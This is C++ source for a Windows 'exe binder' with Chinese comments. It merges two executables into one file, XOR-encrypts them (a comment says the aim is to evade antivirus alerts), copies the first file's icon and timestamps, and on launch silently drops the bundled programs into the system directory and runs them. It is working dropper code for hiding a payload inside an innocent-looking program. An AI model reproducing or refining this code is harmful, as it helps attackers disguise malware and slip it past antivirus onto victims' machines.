// nteXeBinder.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "stdio.h"
#include "resource.h"
#include "sys/stat.h"  //加入状态显示头文件
#include "SYS/TYPES.H" //加入类型定义头文件
#include <windows.h>

#pragma pack(1)

#ifdef NDEBUG

#endif // NDEBUG

//隐藏运行时的dos窗口
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma comment(lib,"msvcrt.lib")
#if (_MSC_VER < 1300)  
#pragma comment(linker,"/IGNORE:4078")  
#pragma comment(linker,"/OPT:NOWIN98")
#endif 
#define WIN32_LEAN_AND_MEAN

typedef struct ICONRESDIR { 
	BYTE Width; 
	BYTE Height; 
	BYTE ColorCount; 
	BYTE reserved; 
} ICONRESDIR;  //图标结构

typedef struct tagRESDIR { 
	ICONRESDIR   Icon; 
	WORD    Planes; 
	WORD    BitCount; 
	DWORD   BytesInRes; 
	WORD  IconCursorId; 
} RESDIR; 

typedef struct SIMHEADER { 
	WORD Reserved; 
	WORD ResType; 
	WORD ResCount; 
} SIMHEADER, *PSIMHEADER; 

typedef struct {
	const RESDIR* pcResDir;
	BYTE* pMatchIcon;
} MyEnumResNameProcData;

struct MODIFY_DATA {
	unsigned int finder; // 常量(定位自身)
	_off_t my_length;      //文件长度(自身)
} modify_data = {0x12345678, 0};


void Create_Process(const char* temp_exe, BOOL async);//创建分解文件时的进程
void UnbindRun(); //分解已捆绑的文件，同时运行它们
BOOL BindFiles(); //将二个可执行文件绑定在一起
BYTE* FindMatchIcon(const RESDIR* pcResDir); //查询匹配图标
void IconsProcess(); //列出所有图标

_off_t prog1_length ;
TCHAR my_name[MAX_PATH];
BYTE *buf ;
//his_name图标文件名
char his_name[MAX_PATH];
char szDestPathName[MAX_PATH];
char chFirstPathName[MAX_PATH];
char chSecondPathName[MAX_PATH];

UINT key=8;

  
void Encrypt(unsigned char * szBuffer, int len)
{
	  
		for(int i=0;i<len;i++)
		szBuffer[i]=szBuffer[i]^key;
}



void Usage(char *progname)
{
/* Modify here to add your Usage message when the program is
	* called without arguments */
	printf("Usage: %s \n[-f 第一个文件] \n[-s 第二个文件] \n\[-t 生成的目标文件] \n[-i 使用该文件的图标，本项为可选项]\n",progname);
    ExitProcess(-1);
}


void HandleOptions(int argc, char **argv)
{
    //处理参数信息
	int  i=0;	
    for(i=1; i <argc ;i++)
    {
        if (((argv[i][0] != '/') && (argv[i][0] != '-')) || (strlen(argv[i]) < 2)||argc<7)
            Usage(argv[0]);
        else
        {
            switch (tolower(argv[i][1]))
            {
			case 'f':
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(chFirstPathName,argv[++i]);
				break;
			case 's':               
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(chSecondPathName,argv[++i]);
				break;
			case 't':              
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(szDestPathName,argv[++i]);
				break;
			case 'i':
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(his_name,argv[++i]);
				break;
			default:
				Usage(argv[0]);
				break;
            }
        }
    }
}

int main(int argc, char* argv[])
{

	//若不指定图标文件则使用第一个文件的图标
	if(strlen(his_name)==0)
		strcpy(his_name,chFirstPathName);
	//获取自身文件名
	::GetModuleFileName(0, my_name, sizeof(my_name));
	struct _stat ST; 
	_stat(my_name, &ST);
	//此外加入捆绑器程序的最终大小，来判断是绑定文件还是分解执行文件
	//该值是硬编码到程序中，依据捆绑程序文件的实际大小来设置
	if(ST.st_size >32768) 
	{		
		//解捆绑文件并运行
		UnbindRun(); 
		//直接退出程序,不显示捆绑程序画面
		exit(0);    
	}
	//若要捆绑文件的话，则必须处理参数信息
	HandleOptions(argc, argv);
	BindFiles();
	return 0;
}


//枚举所有图标资源
BOOL CALLBACK MyEnumResNameProc(
 HMODULE hExe,   // 资源句柄
 LPCTSTR lpszType,  // 资源类型
 LPTSTR lpszName,   // 资源名称
 LPARAM lParam    // 自定义消息参数
)
{
     HRSRC hRsrc = 0;
     HGLOBAL hMem;
     DWORD nDataLen;
     SIMHEADER* pDirHeader;
     RESDIR* pResDir;
     BYTE* pData;
     unsigned int k;

     MyEnumResNameProcData* pMyDataStruct = (MyEnumResNameProcData*)lParam;

     hRsrc = FindResource(hExe, lpszName, RT_GROUP_ICON);
     hMem = LoadResource(hExe, hRsrc);
     pDirHeader = (SIMHEADER*)LockResource(hMem);
     pResDir = (RESDIR*)(pDirHeader+1);

	 //枚举
     for (k = 0; k < pDirHeader->ResCount; k++)
     {
          if (pResDir[k].BytesInRes == pMyDataStruct->pcResDir->BytesInRes &&
               pResDir[k].BitCount == pMyDataStruct->pcResDir->BitCount &&
               pResDir[k].Planes == pMyDataStruct->pcResDir->Planes &&
               memcmp(&pResDir[k].Icon, &pMyDataStruct->pcResDir->Icon, sizeof(pResDir->Icon)) == 0)
          {
			  //if语句成立，也就是GRPICONDIRENTRY结构完全匹配
               hRsrc = FindResource(hExe, MAKEINTRESOURCE(pResDir[k].IconCursorId), RT_ICON); 
               hMem = LoadResource(hExe, hRsrc );

               nDataLen = SizeofResource( hExe, hRsrc );
               pData =(BYTE*)LockResource(hMem);

			   //设置返回图标数据
               pMyDataStruct->pMatchIcon = pData;
			   //终止枚举
               return FALSE; 
          }
     }
     return TRUE;
}

 //查询匹配图标
BYTE* FindMatchIcon(const RESDIR* pcResDir)
{
     HMODULE hExe;
     MyEnumResNameProcData myDataStruct;
     
     myDataStruct.pMatchIcon = NULL;
     myDataStruct.pcResDir = pcResDir;

     hExe = LoadLibraryEx(his_name, NULL, LOAD_LIBRARY_AS_DATAFILE);
	 
	 if (hExe ==NULL)
     {
		 GetLastError();
		 return NULL;
     }

     if (EnumResourceNames(hExe, RT_GROUP_ICON, MyEnumResNameProc, (LPARAM)&myDataStruct) == 0 && 
          myDataStruct.pMatchIcon == 0)
     {
          printf("文件中没有找到图标,用默认图标");

		  return NULL;
     }

     return myDataStruct.pMatchIcon;
}

//列出所有图标
void IconsProcess()
{
     HRSRC hRsrc;
	 // 为0时，表示为自身模块
     const HMODULE hExe = 0; 
     HGLOBAL hMem;
     DWORD nDataLen = 0;
     SIMHEADER* pDirHeader;
     RESDIR* pResDir;
     unsigned int ii, kk, n;
     
	 //载入自身模块，找出其中的主程序图标为默认合成文件图标(如果第一个要绑定文件无图标的话)
     hRsrc = FindResource(hExe, MAKEINTRESOURCE(IDI_ICON1), RT_GROUP_ICON); 
     hMem = LoadResource(hExe, hRsrc );

     nDataLen = SizeofResource( hExe, hRsrc );
     pDirHeader = (SIMHEADER*)LockResource(hMem);
	 //GRPICONDIRENTRY 结构
     pResDir = (RESDIR*)(pDirHeader+1);
     //在内存中搜索组图标资源头部
     for (ii = 0; ii < modify_data.my_length - nDataLen; ii++)
     {
          for (kk = 0; kk < nDataLen; kk++)
          {
               if (buf[ii+kk] != ((BYTE*)pDirHeader)[kk])
                    break;
          }

		  //完全匹配时，if语句为真，退出循环
          if (kk == nDataLen)
               break;
     }

	 //pDirHeader->ResCount为图标资源中图像的个数，枚举该组中所有图标
     for (n = 0; n < pDirHeader->ResCount; n++)
     {
          DWORD nDataLen1 = 0;
          //指向图标图像数据
		  BYTE* pData;
          unsigned int i, k;

		  //查找图标
          hRsrc = FindResource(hExe, MAKEINTRESOURCE(pResDir[n].IconCursorId), RT_ICON); 
          hMem = LoadResource(hExe, hRsrc );

          nDataLen1 = SizeofResource( hExe, hRsrc );

		  //锁定并设置访问图标数据指针
          pData= (BYTE*)LockResource(hMem);
		  //在buf中也即是内存中的自身文件中查找本图标以便替换
          for (i = 0; i < modify_data.my_length - nDataLen1; i++)
          {
               for (k = 0; k < nDataLen1; k++)
               {
                    if (buf[i+k] != pData[k])
                         break;
               }
			   //若if语句为真，则在文件中定位图标成功，可以着手对其进行处理了
               if (k == nDataLen1)
               {
                    BYTE* pMatchIcon = NULL;
                    if (pMatchIcon = FindMatchIcon(pResDir+n))
						//若找到匹配图标，则直接使用找到的图标对buf也即是自身文件中
						//相应图标进行覆盖
                         memcpy(buf+i, pMatchIcon, nDataLen1);
                    else//
                    {
						//未发现匹配图标
                       pResDir[n].BytesInRes = 0; 
                    }

                    break;
               }
          }
     }
	 //清除组图标资源中未发现的图标，组图标资源在文件中起始地址buf+ii
	 //实际上，没有发现的图标的大小已被设为0:pResDir[n].BytesInRes = 0; 
	 //但在使用到此图标时，Windows将依据图标的选取规则选取可以替代的图标
	 memcpy(buf+ii, pDirHeader, nDataLen);
}

void Create_Process(const char* temp_exe, BOOL async)
{
     HANDLE hProcess;
     HANDLE hThread;
     PROCESS_INFORMATION PI;
     STARTUPINFO SI;

     memset(&SI, 0, sizeof(SI));
     SI.cb = sizeof(SI);
	 CreateProcess(temp_exe, NULL, NULL, NULL, FALSE,NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);	      

	 hProcess = PI.hProcess;       
     hThread = PI.hThread;
	 //异步执行时，执行后不删除分解后的文件;同步执行时，执行后删除分解后的文件
     if (!async)  //同步执行
     {
          WaitForSingleObject(hProcess, INFINITE);
          unlink(temp_exe);
     }
}

//分解已捆绑的文件，同时运行它们
void UnbindRun()
{
	//自身文件
	FILE* myself;         
	//分解后文件
	FILE* out;            
	int bytesin;
	int totalbytes = 0;
	long nFileStepbytes = 0;
	//文件索引，可能有多个文件需要解绑定
	int nIndex = 1;
	
	TCHAR chSystemDir[MAX_PATH],strSystemDir[MAX_PATH];
	GetSystemDirectory(chSystemDir,MAX_PATH);
	strcpy(strSystemDir,chSystemDir);
	
	//分配与自身原始文件大小相等的缓冲区？
	buf = (BYTE*)malloc(modify_data.my_length);
	//打开最终的合成文件
	myself = fopen(my_name, "rb");  
	if (myself == NULL)
	{
		free(buf);
		printf("解捆绑文件中，打开自身文件时出错!");
		return;
	}
	
	//步进长度:原始文件大小
	nFileStepbytes = nFileStepbytes + modify_data.my_length;
	
	struct _stat ST;
	_stat(my_name, &ST);
	//步进长度与现文件大小不等时循环，
	//直到所有文件都解捆绑完毕，二者才相等
	while(nFileStepbytes != ST.st_size)
	{
		totalbytes = 0;     
		char temfile[MAX_PATH];
		//..sys\tem1.exe
		sprintf(temfile,"%s%s%d%s",strSystemDir,"\\temp",nIndex,".exe");
		//创建第一个绑定的文件
		out = fopen(temfile, "wb");   
		if (out == NULL)
		{
			free(buf);
			printf("解捆绑文件中，创建第一个被绑定文件时出错!");
			return;
		}
		
		//将文件指针定位到捆绑器程序长度尾部，因为紧接着就是绑定文件的长度
		fseek(myself, nFileStepbytes, SEEK_SET);
		//读取第一个绑定文件的长度　
		if (fread(&prog1_length, sizeof(prog1_length), 1, myself) == 0)
		{
			free(buf);
			printf("解捆绑文件中，读取第一个被绑定文件长度时出错!");
			return;
		}
		
		//读取第一个文件内容借助于buf将它写到磁盘
		while (bytesin = fread(buf, 1, sizeof(buf), myself))
		{
			//若此时第一个文件已读完且已读到第二个文件
			if (totalbytes + bytesin > prog1_length)
				//实际上，上次fread操作中
				//只有(prog1_length - totalbytes)字节数据属于第一个文件
				bytesin = prog1_length - totalbytes;
			//解密所读文件数据
			Encrypt(buf,bytesin);
			//将解密后的数据写到磁盘
			totalbytes += fwrite(buf, 1, bytesin, out);
		}
		//关闭第一个绑定文件句柄
		fclose(out);  
		
		if (totalbytes == 0)
		{
			free(buf);
			printf("解捆绑文件中，在自身文件中没有被解捆绑的对象!");
			return;
		}
		//步进长度在捆绑器基础上增加文件一的长度和sizeof(prog1_length)
		nFileStepbytes = nFileStepbytes + sizeof(prog1_length) + prog1_length;
		//读取下一个文件
		nIndex++;
	}
	//关闭最终合成文件句柄
	fclose(myself); 
	//释放缓冲区
	free(buf);   
		
	//置为分解后，为异步执行方式，此时nIndex的值为解困帮所得的文件的个数
	for(int i = 1; i < nIndex; i++)
	{
		char temfile[MAX_PATH];
		sprintf(temfile,"%s%s%d%s",strSystemDir,"\\temp",i,".exe");
		//运行程序
		Create_Process(temfile, TRUE); 
	}
	
}

//绑定多个文件为一个合成文件
BOOL BindFiles()
{
    //自身文件
	FILE* myself; 
	//最终合成文件
	FILE* out;
	//待绑定文件
	FILE* in;
	int bytesin;
	int totalbytes = 0;
	struct _stat ST;
	unsigned int finder = 0x12345678;
	unsigned int i, k;

     _stat(my_name, &ST);
	 //存储自身文件原始大小
     modify_data.my_length = ST.st_size;
     if (modify_data.my_length == 0)
     {
          printf("绑定文件中，自身文件长度为零时出错!");
		  return FALSE;
     }

	 //分配自身原始大小的缓冲区，由全局变量buf指向
     buf = (BYTE *)malloc(modify_data.my_length);
     if (buf == NULL)
     {
          printf("绑定文件中，分配自身文件长度时出错!");
		  return FALSE;
     }

	 //打开自身文件
     myself = fopen(my_name, "rb");
     if (myself == NULL)
     {
          free(buf);
          printf("绑定文件中，打开自身文件时出错!");
		  return FALSE;
     }

	 //将自身文件读到内存中，由buf指向
     bytesin = fread(buf, 1, modify_data.my_length, myself);
     fclose(myself);

	 //读取文件大小与实际文件大小不等时
     if (bytesin != modify_data.my_length)
     {
          free(buf);
          printf("绑定文件中，不能完全读取自身文件内容时出错!");
		  return FALSE;
     }
	 //步进为sizeof(finder)，循环查找内存中的0x12345678标志
     for (i = 0; i < modify_data.my_length - sizeof(finder); i += sizeof(finder))
     {
          //小循环:逐字节比较，以查找0x12345678标志
		 for (k = 0; k < sizeof(finder); k++)
          {
               if (buf[i+k] != ((BYTE*)&finder)[k])
                    break;
          }
		  //常量finder是全局变量modify_data（占位符的应用）
		  //的一个字段，编译后存储在exe文件的某处，它用于定位文件自身
		  if (k == sizeof(finder))
          {			  
              //此时，说明0x12345678标志已完全匹配，将modify_data保存在此位置
			  //因为在此之前，modify_data.my_length已被初始化为文件自身大小
			  memcpy(buf+ i, &modify_data, sizeof(modify_data));
              break;
          }
     }
	 
     if (i >= modify_data.my_length - sizeof(finder))
     {
          free(buf);
          printf("绑定文件中，不能定位自身文件时出错!");
		  return FALSE;
     }	 
	 //图标的处理
	 IconsProcess();
	 //创建最终合成文件
	 out = fopen(szDestPathName, "wb"); 
     if (out == NULL)
     {
          free(buf);
          printf("绑定文件中，创建绑定后生成的合成文件时出错!");
		  return FALSE;
     }

	 char listfile[2][MAX_PATH];
	 strcpy(listfile[0],chFirstPathName);
	 strcpy(listfile[1],chSecondPathName);
	 //捆绑两个文件
	 int n=2;
	 for(int j = 0; j < n; j++)
	 {		
		 char strFilePath[MAX_PATH];
		 strcpy(strFilePath,listfile[j]);
		 
		 if (_stat(strFilePath, &ST) != 0 || ST.st_size == 0)
		 {
			 free(buf);
			 printf("绑定文件中，读取要绑定的文件时出错!");
			 return FALSE;
		 }
		 
		 totalbytes += fwrite(buf, 1, bytesin, out);
		 
		 //打开要绑定的文件
		 in = fopen(strFilePath, "rb");  
		 if (in == NULL)
		 {
			 free(buf);
			 printf("绑定文件中，打开要绑定的文件时出错!");
			 return FALSE;
		 }
		 
		 
		 //写入要绑定文件的长度到合成文件中
		 totalbytes += fwrite(&ST.st_size, 1, sizeof(ST.st_size), out);
		 
		 //写文件数据，首先将数据读到缓冲区buf，每次读的大小为nteXeBinder的大小
		 while (bytesin = fread(buf, 1, modify_data.my_length, in))
		 {
			 //加密数据，以便逃避杀毒软件的报警
			 Encrypt(buf,bytesin);
			 totalbytes += fwrite(buf, 1, bytesin, out);
		 }
		 //关闭绑定文件句柄
		 fclose(in); 		 
	 }     

	 //关闭最终合成文件句柄
	 fclose(out); 
	 //释放缓冲区
     free(buf);   

	 printf("\n捆绑成功!\n");
	 //////////////////////////////
	 //更改文件的时间属性
	 //////////////////////////////
	 FILETIME		lpCreationTime;
	 FILETIME		lpLastAccessTime;
	 FILETIME		lpLastWriteTime;
	 
	 HANDLE hTimeFile = CreateFile(chFirstPathName, GENERIC_READ,
		 FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 
		 FILE_ATTRIBUTE_NORMAL, NULL); 	
	 GetFileTime(hTimeFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);
	  

	 HANDLE hDestFile = CreateFile(szDestPathName, 
		 GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 	
	 SetFileTime(hDestFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);
	 
	 CloseHandle(hTimeFile);
	 CloseHandle(hDestFile); 
	 return TRUE;
}



